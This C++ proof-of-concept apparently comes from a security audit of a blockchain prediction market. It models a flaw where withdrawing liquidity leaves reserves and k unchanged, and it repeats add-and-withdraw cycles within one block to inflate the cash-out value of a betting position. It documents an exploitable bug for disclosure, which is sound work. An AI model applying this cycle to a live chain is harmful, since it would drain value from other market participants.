// T3 — pm_withdraw_liquidity returns LP principal but never shrinks the binary
// reserves or k (pm_evaluator.cpp:1343-1352 vs pm_add_liquidity :1298-1309), and the
// guard at :1333 permits withdrawal DURING the betting period (inverted vs its own
// message), so add→withdraw can be repeated in one block.
#include <graphene/chain/pm/leverage.hpp>
#include <cstdio>
using namespace graphene::chain::pm;

struct mkt { int64_t ra, rb; fc::uint128_t k; int64_t liquidity_sum, bets_sum; };

static void add_liquidity(mkt& m, int64_t amount) {            // :1298-1309
    m.liquidity_sum += amount;
    int64_t half = amount / 2;
    m.ra += half; m.rb += amount - half;
    m.k = fc::uint128_t((uint64_t)m.ra) * fc::uint128_t((uint64_t)m.rb);
}
static void withdraw_liquidity(mkt& m, int64_t amount) {       // :1343-1352 (binary: no reserve/k touch)
    m.liquidity_sum -= amount;
}
static int64_t place_bet(mkt& m, int64_t amount, int side) {
    int64_t rin = side == 0 ? m.ra : m.rb, rout = side == 0 ? m.rb : m.ra;
    int64_t new_out = (int64_t)(m.k / fc::uint128_t((uint64_t)(rin + amount))).lo;
    int64_t tokens = rout - new_out;
    if (side == 0) { m.ra += amount; m.rb = new_out; } else { m.rb += amount; m.ra = new_out; }
    m.bets_sum += amount;
    return tokens;
}

int main() {
    mkt m{1000000, 1000000, 0, 2000000, 0};
    m.k = fc::uint128_t((uint64_t)m.ra) * fc::uint128_t((uint64_t)m.rb);

    const int64_t stake = 100000;
    int64_t tokens = place_bet(m, stake, 0);                   // a position to cash out later
    printf("position: staked %lld on side A, holds %lld A-tokens\n", (long long)stake, (long long)tokens);
    printf("%-6s %-12s %-12s %-24s %-14s %-14s\n", "cycle", "reserve_a", "reserve_b", "k",
           "VIZ held", "cancel_value");
    for (int cycle = 0; cycle <= 3; ++cycle) {
        if (cycle) { add_liquidity(m, 10000000); withdraw_liquidity(m, 10000000); }  // same block
        char kbuf[48];
        if (m.k.high_bits()) snprintf(kbuf, sizeof kbuf, "%lluh:%llul", (unsigned long long)m.k.high_bits(),
                                      (unsigned long long)m.k.low_bits());
        else                 snprintf(kbuf, sizeof kbuf, "%llu", (unsigned long long)m.k.low_bits());
        printf("%-6d %-12lld %-12lld %-24s %-14lld %-14lld\n", cycle, (long long)m.ra, (long long)m.rb, kbuf,
               (long long)(m.liquidity_sum + m.bets_sum),
               (long long)leverage::cancel_value(m.ra, m.rb, m.k, tokens, 0));
    }
    printf("\nEach cycle deposits 10,000,000 and takes the same 10,000,000 straight back out:\n"
           "'VIZ held' is unchanged, but the virtual reserves and k keep growing, and the exit\n"
           "value of the SAME %lld-token position rises with them.\n", (long long)tokens);
    return 0;
}
